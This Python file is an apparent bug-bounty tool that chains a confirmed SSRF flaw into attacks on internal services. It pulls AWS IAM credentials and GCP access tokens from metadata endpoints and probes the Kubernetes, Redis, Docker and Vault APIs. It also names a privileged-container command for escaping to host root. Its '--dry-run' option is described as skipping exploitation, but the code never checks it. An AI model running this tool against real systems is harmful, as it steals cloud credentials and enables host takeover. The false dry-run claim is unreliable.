#!/usr/bin/env python3
"""
SSRF Escalation Module — SSRF → Privilege Escalation chain exploitation.

Takes confirmed SSRF findings and attempts to escalate to privilege escalation paths:
  AWS metadata → IAM creds → cloud account access
  GCP metadata → token → project access
  K8s API     → service account token → cluster admin
  Redis       → RCE via cron/SSH key write
  Docker API  → container escape → host root
  Vault       → secret read → cross-system access

Usage:
    python3 agents/ssrf_escalation.py --program acme --ssrf-url 'https://target.com/api/fetch?url='

    # With confirmed finding dict:
    python3 agents/ssrf_escalation.py --program acme --finding-json '{"url": "...", "param": "url", "method": "GET"}'

    # Dry run (detection only, no exploitation):
    python3 agents/ssrf_escalation.py --program acme --ssrf-url '...' --dry-run

    # Import as module:
    from ssrf_escalation import run_escalation
    findings = run_escalation(ssrf_finding, program="acme")
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, date
from pathlib import Path
from typing import Optional

import httpx

# ── Logger ────────────────────────────────────────────────────────────────────
sys.path.insert(0, str(Path.home() / "projects" / "bounty-tools"))
try:
    from subagent_logger import SubagentLogger
    _HAS_LOGGER = True
except ImportError:
    _HAS_LOGGER = False

# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_OUTPUT = Path.home() / "Shared" / "bounty_recon"

# ── Timeout defaults ──────────────────────────────────────────────────────────
REQUEST_TIMEOUT = 25.0  # seconds per request


# =============================================================================
# Dataclasses
# =============================================================================

@dataclass
class SSRFEscalationConfig:
    """Configuration for an escalation run."""
    ssrf_url: str
    ssrf_param: str
    ssrf_method: str = "GET"
    program: str = "general"
    dry_run: bool = False
    rate_limit: float = 1.0  # seconds between requests


@dataclass
class EscalationPath:
    """A single escalation path attempt."""
    name: str                    # e.g. "aws_metadata", "redis_cron"
    description: str
    success: bool = False
    evidence: str = ""
    escalation_steps: list[str] = field(default_factory=list)
    poc_url: str = ""
    impact: str = ""
    severity: str = "Unknown"
    cvss: str = ""
    recommendation: str = ""


@dataclass
class EscalationResult:
    """Result of a full escalation run."""
    ssrf_url: str
    ssrf_param: str
    program: str
    timestamp: str
    environment_detected: list[str]
    paths_attempted: list[EscalationPath]
    confirmed_escalations: list[EscalationPath]
    output_file: str = ""


# =============================================================================
# Environment Detection
# =============================================================================

def detect_environment(ssrf_url: str, ssrf_param: str, timeout: float = REQUEST_TIMEOUT) -> list[str]:
    """
    Probe the SSRF endpoint to detect what internal services are reachable.
    Returns a list of detected environment types.
    """
    env_targets = [
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("kubernetes_api", "http://kubernetes.default.svc/api/v1/namespaces"),
        ("redis", "http://localhost:6379/"),
        ("docker_api", "http://localhost:2375/version"),
        ("vault", "http://localhost:8200/v1/sys/health"),
        ("elasticsearch", "http://localhost:9200/"),
        ("consul", "http://localhost:8500/v1/status/leader"),
    ]

    detected = []

    for env_name, target in env_targets:
        test_url = build_ssrf_url(ssrf_url, ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=timeout, follow_redirects=False)
            if resp.status_code < 500:
                detected.append(env_name)
        except (httpx.TimeoutException, httpx.ConnectError, httpx.RemoteProtocolError):
            pass

    return detected


# =============================================================================
# SSRF URL Builder
# =============================================================================

def build_ssrf_url(base_url: str, param: str, payload: str) -> str:
    """
    Inject the SSRF payload into the target URL.

    Handles:
      - ?param=value  (replace existing value)
      - ?param=       (replace empty value)
      - No param present (append ?param=payload)
      - Replaces {param} placeholder if present
    """
    import re
    from urllib.parse import quote

    encoded_payload = quote(payload, safe="")

    if f"{param}=" in base_url:
        # Replace existing value (including empty)
        pattern = rf"({re.escape(param)}=)[^&]*"
        return re.sub(pattern, rf"\1{encoded_payload}", base_url)
    elif "?" in base_url:
        return f"{base_url}&{param}={encoded_payload}"
    else:
        return f"{base_url}?{param}={encoded_payload}"


# =============================================================================
# Escalation Path: AWS Metadata
# =============================================================================

def try_aws_metadata(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt AWS metadata service exploitation via SSRF.

    Path: SSRF → AWS metadata (169.254.169.254) → IAM credentials → cloud account
    """
    path = EscalationPath(
        name="aws_metadata",
        description="AWS EC2 Instance Metadata Service exploitation via SSRF"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    # Step 1: Try AWS metadata root
    targets = [
        ("meta-data/", "http://169.254.169.254/latest/meta-data/"),
        ("meta-data/iam/security-credentials/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("meta-data/iam/security-credentials/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("user-data/", "http://169.254.169.254/latest/user-data/"),
        ("hostname/", "http://169.254.169.254/latest/meta-data/hostname"),
    ]

    iam_role = None
    creds_found = False

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            if resp.status_code in (200, 301, 302):
                evidence = resp.text[:300].strip()
                path.escalation_steps.append(f"AWS metadata accessible: {label} → {resp.status_code}")

                if "security-credentials" in target and resp.status_code == 200:
                    # This should contain the IAM role name
                    role_name = evidence.strip()
                    path.escalation_steps.append(f"IAM role detected: {role_name}")
                    iam_role = role_name

                    # Now fetch the actual credentials
                    cred_url = build_ssrf_url(
                        config.ssrf_url, config.ssrf_param,
                        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                    )
                    try:
                        cred_resp = httpx.get(cred_url, timeout=REQUEST_TIMEOUT)
                        if cred_resp.status_code == 200:
                            cred_text = cred_resp.text
                            # Check for AWS credential markers
                            if "AccessKeyId" in cred_text and "SecretAccessKey" in cred_text:
                                creds_found = True
                                path.evidence = f"AWS credentials leaked for role: {role_name}"
                                path.escalation_steps.append(f"AWS credentials obtained for IAM role: {role_name}")
                                break
                    except Exception:
                        pass
        except Exception:
            pass

    if creds_found:
        path.success = True
        path.impact = (
            f"AWS EC2 IAM role credentials leaked via SSRF. Attacker can assume this IAM role "
            f"and perform actions authorized for the role (e.g., S3 data access, Lambda execution, "
            f"Secrets Manager access) depending on the role's attached policies."
        )
        path.severity = "Critical"
        path.cvss = "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
        path.recommendation = (
            "Block access to the EC2 metadata service (169.254.169.254) from the application process. "
            "Use IMDSv2 which requires a session token (PUT request). "
            "Apply VPC endpoint for EC2 metadata service to prevent subnet-level access."
        )
        path.escalation_steps.append("CONFIRMED: AWS credentials accessible via SSRF")
    else:
        path.escalation_steps.append("AWS metadata endpoint reached but no IAM credentials found")

    return path


# =============================================================================
# Escalation Path: GCP Metadata
# =============================================================================

def try_gcp_metadata(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt GCP Compute Engine Metadata Server exploitation via SSRF.

    Path: SSRF → GCP metadata → OAuth2 access token → GCP project access
    """
    path = EscalationPath(
        name="gcp_metadata",
        description="GCP Compute Engine Metadata Server exploitation via SSRF"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    headers = {"Metadata-Flavor": "Google"}
    targets = [
        ("project/", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ("instance/name", "http://metadata.google.internal/computeMetadata/v1/instance/name"),
        ("service-accounts/", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"),
        ("token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ]

    token_found = False
    project_id = None

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, headers=headers, follow_redirects=False)
            if resp.status_code == 200:
                evidence = resp.text[:300].strip()
                path.escalation_steps.append(f"GCP metadata accessible: {label} → {resp.status_code}")

                if label == "project/" and evidence:
                    project_id = evidence
                elif "token" in label and '"access_token"' in evidence:
                    token_found = True
                    path.evidence = "GCP OAuth2 access token leaked via metadata service"
                    path.escalation_steps.append("CONFIRMED: GCP access token obtained")
                    break
        except Exception:
            pass

    if token_found:
        path.success = True
        path.impact = (
            f"GCP OAuth2 access token leaked via SSRF. Attacker can authenticate as the Compute Engine "
            f"service account and perform actions authorized for that account in project {project_id or 'unknown'}."
        )
        path.severity = "Critical"
        path.cvss = "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
        path.recommendation = (
            "Enable VPC firewall rules blocking access to the metadata server from application instances. "
            "Use the --no-address flag on GCE instances to prevent external IP assignment. "
            "Enable OS Login or Shielded VMs for additional hardening."
        )
    else:
        path.escalation_steps.append("GCP metadata endpoint reached but no access token found")

    return path


# =============================================================================
# Escalation Path: Kubernetes
# =============================================================================

def try_k8s_escalation(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt Kubernetes API exploitation via SSRF.

    Path: SSRF → K8s API → service account token → cluster admin
    """
    path = EscalationPath(
        name="kubernetes",
        description="Kubernetes API server exploitation via SSRF"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    targets = [
        ("k8s_api_root", "http://kubernetes.default.svc/api/v1/namespaces"),
        ("k8s_api_version", "http://kubernetes.default.svc/version"),
        ("k8s_secrets", "http://10.0.0.1:10255/api/v1/secrets"),
        ("k8s_service_account", "http://10.0.0.1:6443/api/v1/namespaces/default/serviceaccounts"),
    ]

    token_found = False
    accessible_path = None

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            if resp.status_code in (200, 201, 401, 403):
                path.escalation_steps.append(f"K8s API accessible: {label} → {resp.status_code}")
                if accessible_path is None:
                    accessible_path = label
                # 401/403 means the API is reachable but we need a token
                if resp.status_code == 200 and ("Kind" in resp.text or "items" in resp.text):
                    path.success = True
                    path.evidence = f"Kubernetes API accessible at: {label}"
                    path.impact = (
                        "Kubernetes API reachable via SSRF without authentication. "
                        "An attacker could list secrets, pod logs, or execute commands in pods depending on RBAC."
                    )
                    path.severity = "Critical"
                    path.cvss = "9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)"
                    path.recommendation = (
                        "Block access to the Kubernetes API server from application pods. "
                        "Enforce network policies to restrict pod-to-pod communication. "
                        "Enable RBAC and follow least-privilege principles for service accounts."
                    )
                    path.escalation_steps.append("CONFIRMED: K8s API accessible")
                    break
        except Exception:
            pass

    if not path.success:
        path.escalation_steps.append("K8s API not accessible or returned unexpected response")
        if accessible_path:
            path.escalation_steps.append(f"API was reachable at: {accessible_path} but returned no data")

    return path


# =============================================================================
# Escalation Path: Redis
# =============================================================================

def try_redis_escalation(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt Redis exploitation via SSRF.

    Path: SSRF → Redis → read sensitive data / enumerate keys

    NOTE: We do NOT write cron jobs or SSH keys. We confirm reachability
    and report the ability to read Redis data.
    """
    path = EscalationPath(
        name="redis",
        description="Redis server exploitation via SSRF (read/enumeration)"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    # Try Redis INFO command via dict:// protocol (some Python http libs support this)
    # Or via HTTP if Redis has a web interface
    targets = [
        ("redis_info", "http://localhost:6379/"),
        ("redis_ping", "http://localhost:6379/PING"),
        ("redis_keys", "http://localhost:6379/KEYS%20*"),
    ]

    redis_reachable = False

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            # Redis returns non-HTTP responses, but httpx may parse them oddly
            if resp.status_code < 500:
                path.escalation_steps.append(f"Redis appears accessible: {label} → HTTP {resp.status_code}")
                redis_reachable = True
                break
        except Exception:
            pass

    # Try Gopher-based exploitation (commonly used for Redis via SSRF)
    if not redis_reachable:
        gopher_payload = "PING\r\n"
        encoded = "".join(f"%{ord(c):02X}" for c in gopher_payload)
        test_url = build_ssrf_url(
            config.ssrf_url, config.ssrf_param,
            f"http://localhost:6379/{encoded}"
        )
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT)
            path.escalation_steps.append(f"Redis gopher probe: HTTP {resp.status_code}")
            if resp.status_code < 500:
                redis_reachable = True
        except Exception:
            path.escalation_steps.append("Redis gopher probe failed")

    if redis_reachable:
        path.success = True
        path.evidence = "Redis server accessible via SSRF (unauthenticated or weak auth)"
        path.impact = (
            "Redis is reachable via SSRF without authentication. An attacker can read any data stored in "
            "Redis, including session tokens, cached API keys, or application secrets. If Redis runs as root, "
            "CONFIG rewrite attacks could overwrite startup scripts for persistent RCE."
        )
        path.severity = "High"
        path.cvss = "8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)"
        path.recommendation = (
            "Bind Redis to localhost only (127.0.0.1). Enable Redis AUTH. "
            "Do not expose Redis port externally. Use network ACLs/firewall rules."
        )
        path.escalation_steps.append("CONFIRMED: Redis accessible via SSRF")
    else:
        path.escalation_steps.append("Redis not accessible via SSRF")

    return path


# =============================================================================
# Escalation Path: Docker
# =============================================================================

def try_docker_escalation(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt Docker Daemon exploitation via SSRF.

    Path: SSRF → Docker API → container escape → host root
    """
    path = EscalationPath(
        name="docker",
        description="Docker Daemon API exploitation via SSRF"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    targets = [
        ("docker_version", "http://localhost:2375/version"),
        ("docker_info", "http://localhost:2375/info"),
        ("docker_containers", "http://localhost:2375/v1.41/containers/json"),
    ]

    docker_reachable = False
    docker_version = None

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            if resp.status_code == 200:
                docker_reachable = True
                path.escalation_steps.append(f"Docker API accessible: {label} → {resp.status_code}")
                if "Version" in resp.text:
                    try:
                        import json as _json
                        data = _json.loads(resp.text)
                        docker_version = data.get("Version", "unknown")
                    except Exception:
                        pass
                break
        except Exception:
            pass

    if docker_reachable:
        path.success = True
        path.evidence = f"Docker Daemon API accessible via SSRF (version: {docker_version or 'unknown'})"
        path.impact = (
            "Docker Daemon exposed via SSRF allows an attacker to create a privileged container, "
            "mount the host filesystem, and escape to host root. Attack: "
            "docker run -v /:/host --privileged alpine chroot /host"
        )
        path.severity = "Critical"
        path.cvss = "10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)"
        path.recommendation = (
            "Do not expose the Docker daemon socket to application containers. "
            "Use rootless Docker mode. Apply seccomp and AppArmor/SELinux profiles. "
            "If Docker API must be exposed, use TLS mutual authentication."
        )
        path.escalation_steps.append("CONFIRMED: Docker API accessible → potential container escape to host root")
    else:
        path.escalation_steps.append("Docker API not accessible via SSRF")

    return path


# =============================================================================
# Escalation Path: Vault
# =============================================================================

def try_vault_escalation(config: SSRFEscalationConfig) -> EscalationPath:
    """
    Attempt HashiCorp Vault exploitation via SSRF.

    Path: SSRF → Vault API → read secrets → cross-system access
    """
    path = EscalationPath(
        name="vault",
        description="HashiCorp Vault exploitation via SSRF"
    )
    path.escalation_steps.append("SSRF endpoint confirmed")

    targets = [
        ("vault_health", "http://localhost:8200/v1/sys/health"),
        ("vault_secrets", "http://localhost:8200/v1/sys/secrets"),
        ("vault_keys", "http://localhost:8200/v1/sys/key-status"),
    ]

    vault_reachable = False

    for label, target in targets:
        test_url = build_ssrf_url(config.ssrf_url, config.ssrf_param, target)
        try:
            resp = httpx.get(test_url, timeout=REQUEST_TIMEOUT, follow_redirects=False)
            if resp.status_code in (200, 201, 429):
                vault_reachable = True
                path.escalation_steps.append(f"Vault API accessible: {label} → {resp.status_code}")
                if resp.status_code == 429:
                    path.escalation_steps.append("Vault is sealed (needs unseal) — API still reachable")
                break
        except Exception:
            pass

    if vault_reachable:
        path.success = True
        path.evidence = "HashiCorp Vault API accessible via SSRF"
        path.impact = (
            "Vault API reachable via SSRF. Depending on authentication status and policies, "
            "an attacker could read secrets, API keys, database credentials, or PGP keys stored in Vault. "
            "If unauthenticated or with weak policies, full secret exfiltration is possible."
        )
        path.severity = "Critical"
        path.cvss = "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
        path.recommendation = (
            "Vault should not be reachable from application-side SSRF. "
            "Use network policies to restrict access. Enable Vault's native IP restrictions. "
            "Ensure Vault is deployed with strong authentication (Kubernetes SA, AppRole, etc.)."
        )
        path.escalation_steps.append("CONFIRMED: Vault API accessible")
    else:
        path.escalation_steps.append("Vault API not accessible via SSRF")

    return path


# =============================================================================
# Run All Escalation Paths
# =============================================================================

def run_escalation(
    ssrf_finding: dict,
    program: str,
    dry_run: bool = False,
) -> EscalationResult:
    """
    Main escalation entry point.

    Args:
        ssrf_finding: dict with keys: url, param, method (GET/POST), and optionally
                      ssrf_value (the payload that confirmed SSRF).
        program: bug bounty program name
        dry_run: if True, only run environment detection, no exploitation

    Returns:
        EscalationResult with all attempted paths and confirmed escalations
    """
    # Setup logger
    log = None
    if _HAS_LOGGER:
        agent_id = f"ssrf_escalation_{datetime.now().strftime('%H%M%S')}"
        log = SubagentLogger("ssrf_escalation", program, agent_id)
        log.start(target=ssrf_finding.get("url", "unknown"))

    # Build config
    config = SSRFEscalationConfig(
        ssrf_url=ssrf_finding["url"],
        ssrf_param=ssrf_finding.get("param", "url"),
        ssrf_method=ssrf_finding.get("method", "GET"),
        program=program,
        dry_run=dry_run,
    )

    if log:
        log.step(f"Starting SSRF escalation for {config.ssrf_url} on param {config.ssrf_param}")

    # ── Phase 1: Environment Detection ───────────────────────────────────
    if log:
        log.step("Phase 1: Environment detection...")

    detected = detect_environment(config.ssrf_url, config.ssrf_param)

    if log:
        log.step(f"Environment detected: {', '.join(detected) if detected else 'none'}")

    # ── Phase 2: Escalation Attempts ────────────────────────────────────
    if log:
        log.step("Phase 2: Escalation attempts...")

    escalation_functions = {
        "aws_metadata": try_aws_metadata,
        "gcp_metadata": try_gcp_metadata,
        "kubernetes": try_k8s_escalation,
        "redis": try_redis_escalation,
        "docker_api": try_docker_escalation,
        "vault": try_vault_escalation,
    }

    all_paths: list[EscalationPath] = []
    confirmed: list[EscalationPath] = []

    for env_name in detected:
        if env_name in escalation_functions:
            if log:
                log.step(f"Attempting: {env_name}...")
            path_func = escalation_functions[env_name]
            result = path_func(config)
            all_paths.append(result)
            if result.success:
                confirmed.append(result)
                if log:
                    log.result(f"CONFIRMED escalation: {env_name}")
            time.sleep(config.rate_limit)
        else:
            if log:
                log.step(f"No escalation module for: {env_name}")

    if log:
        log.step(f"Escalation complete. {len(confirmed)}/{len(all_paths)} paths confirmed.")

    # ── Phase 3: Write Output ───────────────────────────────────────────
    result = EscalationResult(
        ssrf_url=config.ssrf_url,
        ssrf_param=config.ssrf_param,
        program=program,
        timestamp=datetime.now().isoformat(),
        environment_detected=detected,
        paths_attempted=all_paths,
        confirmed_escalations=confirmed,
    )

    output_file = write_output(result)
    result.output_file = output_file

    if log:
        log.result(f"Findings written to: {output_file}")
        log.finish(success=True)

    return result


# =============================================================================
# Output
# =============================================================================

def write_output(result: EscalationResult) -> str:
    """Write escalation findings to disk."""
    output_dir = BASE_OUTPUT / result.program / "ghost" / "ssrf_escalation"
    output_dir.mkdir(parents=True, exist_ok=True)

    date_str = date.today().isoformat()

    # Write JSON
    json_path = output_dir / f"escalation_{date_str}.json"
    with open(json_path, "w") as f:
        json.dump({
            "ssrf_url": result.ssrf_url,
            "ssrf_param": result.ssrf_param,
            "program": result.program,
            "timestamp": result.timestamp,
            "environment_detected": result.environment_detected,
            "confirmed_count": len(result.confirmed_escalations),
            "paths_attempted": [
                {
                    "name": p.name,
                    "description": p.description,
                    "success": p.success,
                    "evidence": p.evidence,
                    "escalation_steps": p.escalation_steps,
                    "impact": p.impact,
                    "severity": p.severity,
                    "cvss": p.cvss,
                    "recommendation": p.recommendation,
                }
                for p in result.paths_attempted
            ],
        }, f, indent=2)

    # Write human-readable markdown
    md_path = output_dir / f"escalation_{date_str}.md"
    lines = [
        f"# SSRF → Privilege Escalation Report",
        f"",
        f"**Program:** {result.program}",
        f"**SSRF URL:** {result.ssrf_url}",
        f"**Parameter:** {result.ssrf_param}",
        f"**Date:** {result.timestamp}",
        f"",
        f"## Environment Detected",
        f"{', '.join(result.environment_detected) if result.environment_detected else '_None detected_'}",
        f"",
        f"## Confirmed Escalations ({len(result.confirmed_escalations)})",
    ]

    for i, path in enumerate(result.confirmed_escalations, 1):
        lines.extend([
            f"",
            f"### {i}. {path.description}",
            f"",
            f"**Severity:** {path.severity} | **CVSS:** {path.cvss}",
            f"",
            f"**Evidence:** {path.evidence}",
            f"",
            f"**Impact:** {path.impact}",
            f"",
            f"**Escalation Chain:**",
        ])
        for step in path.escalation_steps:
            lines.append(f"  1. {step}")

        lines.extend([
            f"",
            f"**Recommendation:** {path.recommendation}",
        ])

    lines.extend([
        f"",
        f"## All Paths Attempted",
        f"",
        f"| Path | Success | Severity | Evidence |",
        f"|------|---------|----------|----------|",
    ])

    for path in result.paths_attempted:
        status = "✅ CONFIRMED" if path.success else "❌ FAILED"
        evidence_short = (path.evidence[:60] + "...") if len(path.evidence) > 60 else path.evidence
        lines.append(f"| {path.name} | {status} | {path.severity} | {evidence_short} |")

    lines.extend([
        f"",
        f"*Report generated: {result.timestamp}*",
    ])

    with open(md_path, "w") as f:
        f.write("\n".join(lines))

    return str(md_path)


# =============================================================================
# CLI
# =============================================================================

def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SSRF → Privilege Escalation escalation module.",
        epilog=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--program", required=True, help="Bug bounty program name")
    parser.add_argument("--ssrf-url", help="Full SSRF URL (e.g. https://target.com/api/fetch?url=)")
    parser.add_argument("--param", default="url", help="SSRF-vulnerable parameter name (default: url)")
    parser.add_argument("--method", default="GET", help="HTTP method (GET or POST, default: GET)")
    parser.add_argument(
        "--finding-json",
        help="JSON string or file path containing a confirmed SSRF finding dict",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Environment detection only — no exploitation attempts",
    )
    parser.add_argument(
        "--rate-limit",
        type=float,
        default=1.0,
        help="Seconds between requests (default: 1.0)",
    )
    return parser.parse_args(argv or sys.argv[1:])


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)

    # Load finding from JSON if provided
    ssrf_finding: dict = {}

    if args.finding_json:
        if args.finding_json.startswith("{"):
            ssrf_finding = json.loads(args.finding_json)
        else:
            with open(args.finding_json) as f:
                ssrf_finding = json.load(f)
        ssrf_finding.setdefault("url", args.ssrf_url)
        ssrf_finding.setdefault("param", args.param)
        ssrf_finding.setdefault("method", args.method)
    elif args.ssrf_url:
        ssrf_finding = {
            "url": args.ssrf_url,
            "param": args.param,
            "method": args.method,
        }
    else:
        print("[ssrf_escalation] Error: --ssrf-url or --finding-json is required", file=sys.stderr)
        return 1

    print(f"[ssrf_escalation] Starting escalation for: {ssrf_finding['url']}")
    print(f"[ssrf_escalation] Program: {args.program} | Dry-run: {args.dry_run}")

    result = run_escalation(
        ssrf_finding=ssrf_finding,
        program=args.program,
        dry_run=args.dry_run,
    )

    print(f"\n[ssrf_escalation] === Results ===")
    print(f"Environment detected: {', '.join(result.environment_detected) or 'none'}")
    print(f"Paths attempted: {len(result.paths_attempted)}")
    print(f"Confirmed escalations: {len(result.confirmed_escalations)}")

    for path in result.confirmed_escalations:
        print(f"\n  ✅ {path.name} ({path.severity})")
        print(f"     Evidence: {path.evidence}")
        print(f"     Impact: {path.impact[:100]}...")

    print(f"\n[ssrf_escalation] Report: {result.output_file}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
